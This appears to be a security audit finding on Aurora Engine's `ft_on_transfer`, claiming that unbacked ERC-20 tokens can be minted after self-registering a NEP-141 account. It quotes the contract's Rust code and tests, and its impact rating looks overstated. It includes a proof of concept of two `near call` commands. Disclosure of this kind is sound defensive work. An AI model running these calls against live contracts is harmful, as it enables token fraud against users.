### Title
Unauthorized ERC-20 Token Minting Without Depositing NEP-141 Collateral via Unguarded `ft_on_transfer` - (File: engine/src/contract_methods/connector.rs)

---

### Summary

The `ft_on_transfer` entry point of the Aurora Engine contract is designed to be called by a legitimate NEP-141 token contract as part of the `ft_transfer_call` flow, after that contract has actually transferred tokens into Aurora. However, there is no enforcement of this assumption. Any NEAR account that is registered in Aurora's NEP-141→ERC-20 mapping can call `ft_on_transfer` directly and mint arbitrary amounts of the corresponding ERC-20 token without depositing any NEP-141 tokens. Because `deploy_erc20_token` is also callable by anyone with no access control, an attacker can register their own account as a NEP-141 token and then exploit `ft_on_transfer` to mint unbacked ERC-20 tokens at will.

---

### Finding Description

**Step 1 — Open `deploy_erc20_token` registration**

The `deploy_erc20_token` contract method has no caller restriction:

```rust
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        // No require_owner_only or any other access check
        let bytes = io.read_input().to_vec();
        let args = DeployErc20TokenArgs::deserialize(&bytes)...;
        ...
    })
}
``` [1](#0-0) 

Any NEAR account can call this and register an arbitrary NEP-141 account ID as a bridged token, deploying an ERC-20 contract for it inside Aurora's EVM.

**Step 2 — `ft_on_transfer` mints based solely on predecessor identity**

The `ft_on_transfer` function dispatches to `receive_erc20_tokens` for any predecessor that is not the eth-connector account:

```rust
let result = if predecessor_account_id == get_connector_account_id(&io)? {
    engine.receive_base_tokens(&args)
} else {
    engine.receive_erc20_tokens(
        &predecessor_account_id,
        &args,
        &current_account_id,
        handler,
    )
};
``` [2](#0-1) 

The only guard inside `receive_erc20_tokens` is a lookup of the predecessor in the NEP-141→ERC-20 map:

```rust
let erc20_token = get_erc20_from_nep141(&self.io, token)?;
let erc20_admin_address = current_address(current_account_id);
let result = self.call(
    &erc20_admin_address,
    &erc20_token,
    Wei::zero(),
    setup_receive_erc20_tokens_input(&recipient, amount),
    u64::MAX,
    ...
).and_then(submit_result_or_err)?;
``` [3](#0-2) 

If the lookup succeeds, the EVM `mint` call is executed immediately. There is no verification that NEP-141 tokens were actually transferred to Aurora before this call. The `amount` field is taken directly from the caller-supplied `args` with no cross-check against any on-chain balance change. [4](#0-3) 

**The ERC-20 `mint` function is gated by `onlyAdmin`**, where admin is the Aurora Engine contract address (`current_address(current_account_id)`). Because `receive_erc20_tokens` calls the EVM as `erc20_admin_address`, the `onlyAdmin` check passes unconditionally. [5](#0-4) 

---

### Impact Explanation

An attacker who registers their own NEAR account as a NEP-141 token in Aurora can call `ft_on_transfer` directly (not through any real token transfer) and mint an arbitrary quantity of the corresponding ERC-20 token to any EVM address. These tokens are indistinguishable on-chain from legitimately bridged tokens. If the attacker's ERC-20 token is accepted by any DeFi protocol on Aurora (AMM, lending market, etc.), the attacker can drain real assets from that protocol. This constitutes direct theft of user funds.

**Impact class**: Critical — direct theft of user funds.

---

### Likelihood Explanation

The attack requires only two NEAR transactions:
1. `deploy_erc20_token` — permissionless, no deposit required beyond NEAR gas.
2. `ft_on_transfer` — callable by any NEAR account; the predecessor is set by the NEAR runtime to the calling account, which the attacker controls.

No privileged keys, governance capture, or oracle manipulation is needed. The attacker controls the `amount` field in the JSON args and can set it to any value up to `u128::MAX`. The only prerequisite is that the attacker's ERC-20 token must be accepted somewhere in Aurora's DeFi ecosystem, which is a realistic condition for a motivated attacker who can seed liquidity or exploit protocols that accept arbitrary ERC-20 tokens as collateral.

---

### Recommendation

1. **Verify that `ft_on_transfer` is called as part of a genuine NEP-141 `ft_transfer_call` flow.** In NEAR, this can be enforced by checking `env::promise_results_count()` and requiring that the call arrives as a callback (i.e., `env.assert_private_call()` or equivalent), or by tracking expected incoming transfers in storage.

2. **Restrict `deploy_erc20_token` to the contract owner or a privileged role**, so that only legitimate NEP-141 tokens can be registered. This prevents an attacker from self-registering a fake NEP-141 account.

3. **Cross-check the minted amount against an expected incoming balance** stored when the NEP-141 transfer is initiated, similar to how the eth-connector tracks proofs.

### Proof of Concept

```
# 1. Attacker creates NEAR account: attacker.near

# 2. Attacker registers their account as a NEP-141 token in Aurora (no access control):
near call aurora deploy_erc20_token \
  '{"nep141": "attacker.near"}' \
  --accountId attacker.near

# 3. Attacker calls ft_on_transfer directly from attacker.near
#    (predecessor_account_id = attacker.near, which is now in the NEP-141→ERC-20 map)
near call aurora ft_on_transfer \
  '{"sender_id": "attacker.near", "amount": "1000000000000000000000000", "msg": "<attacker_evm_address_hex>"}' \
  --accountId attacker.near

# Result: Aurora Engine calls receive_erc20_tokens with token=attacker.near,
# finds the registered ERC-20, and mints 1e24 tokens to the attacker's EVM address.
# No NEP-141 tokens were ever transferred to Aurora.
```

The test `test_ft_on_transfer` in the codebase already demonstrates that calling `ft_on_transfer` with a registered NEP-141 predecessor successfully mints ERC-20 tokens, and `test_ft_on_transfer_fail` confirms that an unregistered predecessor causes a failure — proving the only guard is the NEP-141 registration, which is itself open to anyone.     pub fn receive_erc20_tokens<P: PromiseHandler>(
        &mut self,
        token: &AccountId,
        args: &FtOnTransferArgs,
        current_account_id: &AccountId,
        handler: &mut P,
    ) -> Result<Option<SubmitResult>, ContractError> {
        let amount = args.amount.as_u128();
        // Parse message to determine recipient
        let mut recipient = {
            // The message should contain the recipient EOA address.
            let message = args.msg.strip_prefix("0x").unwrap_or(&args.msg);
            // Recipient - 40 characters (Address in hex without '0x' prefix)
            if message.len() < 40 {
                return Err(ParseOnTransferMessageError::WrongMessageFormat.into());
            }
            let mut address_bytes = [0; 20];
            hex::decode_to_slice(&message[..40], &mut address_bytes)
                .map_err(|_| ParseOnTransferMessageError::WrongMessageFormat)?;
            Address::from_array(address_bytes)
        };

        if let Some(fallback_address) = silo::get_erc20_fallback_address(&self.io)
            && !silo::is_allow_receive_erc20_tokens(&self.io, &recipient)
        {
            recipient = fallback_address;
        }

        let erc20_token = get_erc20_from_nep141(&self.io, token)?;
        let erc20_admin_address = current_address(current_account_id);
        let result = self
            .call(
                &erc20_admin_address,
                &erc20_token,
                Wei::zero(),
                setup_receive_erc20_tokens_input(&recipient, amount),
                u64::MAX,
                Vec::new(), // TODO: are there values we should put here?
                Vec::new(),
                handler,
            )
            .and_then(submit_result_or_err)?;

        sdk::log!("Mint {amount} ERC-20 tokens for: {}", recipient.encode());

        // Return SubmitResult so that it can be accessed in standalone engine.
        // This is used to help with the indexing of bridge transactions.
        Ok(Some(result))
    }

#[test]
fn test_ft_on_transfer() {
    let mut runner = AuroraRunner::new();
    // Standalone runner presently does not support ft_on_transfer
    runner.standalone_runner = None;
    let nep141 = "tt.testnet";
    let alice = "alice";
    let token = runner.deploy_erc20_token(nep141);
    let amount = Balance::new(10);
    let recipient = runner.create_account().address;

    let balance = runner.balance_of(token, recipient, DEFAULT_AURORA_ACCOUNT_ID);
    assert_eq!(balance, U256::from(0));

    let res = runner.ft_on_transfer(nep141, alice, alice, amount, &recipient.encode());
    // Transaction should succeed so return amount is 0
    assert_eq!(res, "\"0\"");

    let balance = runner.balance_of(token, recipient, DEFAULT_AURORA_ACCOUNT_ID);
    assert_eq!(balance, U256::from(amount.as_u128()));
}

#[test]
fn test_ft_on_transfer_fail() {
